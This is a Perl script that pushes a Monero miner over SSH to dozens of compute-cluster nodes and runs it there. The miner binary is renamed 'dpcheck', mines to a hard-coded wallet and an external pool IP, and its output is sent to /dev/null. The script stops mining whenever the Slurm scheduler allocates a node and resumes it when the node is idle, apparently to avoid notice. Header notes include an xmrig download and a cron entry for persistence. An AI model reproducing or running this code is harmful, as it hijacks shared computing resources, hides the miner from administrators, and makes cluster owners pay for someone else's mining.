=b
wget https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
crontab perl /root/xmr/xmr/xmr.pl
nohup /home/jsp/cluster/dpcheck --coin=XMR -o 8.219.234.130:2222 \
       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.190-master \
       -p x 2>&1 >/dev/null &
=cut
use warnings;
use strict;
use Parallel::ForkManager;
my $forkNo = 10;
my $pm = Parallel::ForkManager->new("$forkNo");

my $miner = "lolminer";# or lolminer
my $threads = 2; #thread no for node with 
###main jobs to do
#my $killjobs = "yes";
my $sumitjobs = "yes";
my $killjobs = "no";
#my $sumitjobs = "no";
my $checkstatus = "yes";
my %nodes = (
    #161 => [0],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [8..18],#8..18,20..22,39..41],#[1,3,39..42],#1,3,39..
    #161 => [10],#[1,3,39..42],#1,3,39.., bad node 18
    161 => [1..42],#[1,3,39..42],#1,3,39..    
    #161 => [17],#[1,3,39..42],#1,3,39..    
    182 => [1..4,6..15,17..24],
    186 => [1..7],
    #190 => [1],
    190 => [1..3],
    195 => [1..7]
    );
     #State=ALLOCATED
     #State=IDLE
#get current for the corresponding setting    
my $ip = `/usr/sbin/ip a`;    
$ip =~ /1\d\d\.1\d\d\.\d+\.(\d+)/;
my $cluster = $1;
$cluster =~ s/^\s+|\s+$//;
#print "\$cluster: $cluster\n";
my @allnodes = @{$nodes{$cluster}};#get node information
my @nodes;

#test whether the connection is ok
`touch ~/scptest.dat`;
for (@allnodes){
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    print "****Check $nodename status\n ";
    #`echo "***$nodename" >> $output`;
#use scp for ssh test
	system("scp -o ConnectTimeout=5 ~/scptest.dat root\@$nodename:/root");    
    if($?){
		next;#not available
		}
	else{
		print "scp at $nodename ok for ssh test\n";
        push @nodes, $_;
		}	
}
chomp @nodes;
`rm -f ./dupJobs.dat`;
`touch ./dupJobs.dat`;
for (@nodes){
$pm->start and next;
    my $nodeindex=sprintf("%02d",$_);
    my $nodename= "node"."$nodeindex";
    my $cmd = "/usr/bin/ssh $nodename ";
    my $mining_x = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 8.219.234.130:2222 \\
       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
       -p x 2>&1 >/dev/null &";
    my $mining_t = "nohup /home/jsp/cluster/dpcheck --coin=XMR -o 8.219.234.130:2222 \\
       -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS\.$cluster-$nodename \\
       -p x --threads=$threads 2>&1 >/dev/null &";

    #my $mining_cmd;
    #system("/home/jsp/xmrig-6.18.1/xmrig --coin=XMR -o 18.167.166.214:2222 -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.RIG_ID -p x");
    #./xmrig --coin=XMR -o  18.167.166.214:2222 -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.nuu -p x
    #./xmrig --coin=XMR -o  xmr.2miners.com:2222 -u 89g9n2yjhehJxhjLG9JTsP7smM9MnddbcgiEiCJ2bdyHGXGzsVZc9NpMSJpywd5kbY6zbogerdmpaVxiHpPuCioCSwGE8gS.RIG_ID -p x
   #iptables -A INPUT -p all -s 18.167.166.214 -j ACCEPT
     my $temp = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\""`;
    print "*****$nodename*****\n";
    print "###node status before all cmd:\n $temp\n";
    if($killjobs eq "yes"){
        print "#Want to kill job\n";
        if($temp){
            print "****killing job\n";
            `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill -9"`;
        }
        else{
             print "No existing job currently!\n";
        }
    }

    if($sumitjobs eq "yes"){
        #my $threads = `$cmd "/usr/bin/lscpu |/usr/bin/grep -v grep|/usr/bin/grep \\\"^CPU(s):\\\"|awk '{print \\\$2}'"`;
        # ssh node01 "/usr/bin/lscpu |/usr/bin/grep -v grep|/usr/bin/egrep \"^CPU(s):\"|awk '{print \$2}'";
        #lscpu|grep "^CPU(s):"|awk '{print $2}'
        #chomp $threads;
        #print "\n\n#########\$threads: $threads\n\n\n";
        #die;
        my $state = `scontrol show node $nodename|grep ALLOCATED`;#used 
        my $temp_t = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/grep '\\\--threads='"`;#has been used
        my $temp_x = `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/grep -v '\\\--threads=' |/usr/bin/grep dpcheck"`;#has been used
        chomp ($state,$temp_t,$temp_x);       
# print "killing job\n";
       #     `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"xmrig\\\"|awk '{print \\\$2}'|xargs kill"`;
    if ($state){#ALLOCATED
        print "***node with ALLOCATED state: $nodename\n";
       # if($temp_x){#full performance 
          #kill first then submit thread job
          print "killing all jobs\n";
          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
          sleep(1);
          print "Allocated, kill all jobs. No Submitting t job\n";
        #    my $pid = fork();
		#    if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
       # }#$temp_x true and allocated
        #elsif(!$temp_x and !$temp_t){#no jobs with ALLOCATED state
        #    print "Allocated with no jobs. Submitting t job\n";            
        #    #my $pid = fork();
		#    #if ($pid == 0) {exec("$cmd '$mining_t'");}# if($pid == 0);
        #}        
        #else{ print "job exist for node with ALLOCATED state: $nodename\n"; }
    }
    else
    {#not ALLOCATED
        print "*node with No ALLOCATED state: $nodename\n";
        if($temp_t){# t job exists 
          #kill t job first then submit x job
          print "killing t job\n";
          `$cmd "/usr/bin/ps aux|/usr/bin/grep -v grep|/usr/bin/egrep \\\"dpcheck\\\"|awk '{print \\\$2}'|xargs kill"`;
          sleep(1);
          print "No Allocated, kill t job. Submitting x job\n";
            my $pid = fork();
		    if ($pid == 0) {exec("$cmd '$mining_x'");}# if($pid == 0);
        }#$temp_x true and allocated
        elsif(!$temp_x and !$temp_t){#no jobs
            print "No Allocated with no jobs. Submitting x job\n";            
            my $pid = fork();
		    if ($pid == 0) {exec("$cmd '$mining_x'");}# if($pid == 0);
        }
        else{ print "job exists for node with No ALLOCATED state: $nodename\n"; }

    }
       
        
    }#submitjob eq yes or no

    if($checkstatus eq "yes"){
        $temp = `$cmd "ps aux|grep -v grep|grep dpcheck"`;
        print "#Want to check node current status\n";
        print "Checking status\n";
        print "output:$temp\n";
    }
$pm->finish;
}
$pm->wait_all_children;
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp|awk '{print \$2}'|xargs kill");
sleep(1);
if($?) {print "$!\n";}
print "doing final grep check. If the following is empty, it is done.\n";
system("ps aux|grep -v grep|grep 'ssh node'|grep jsp");
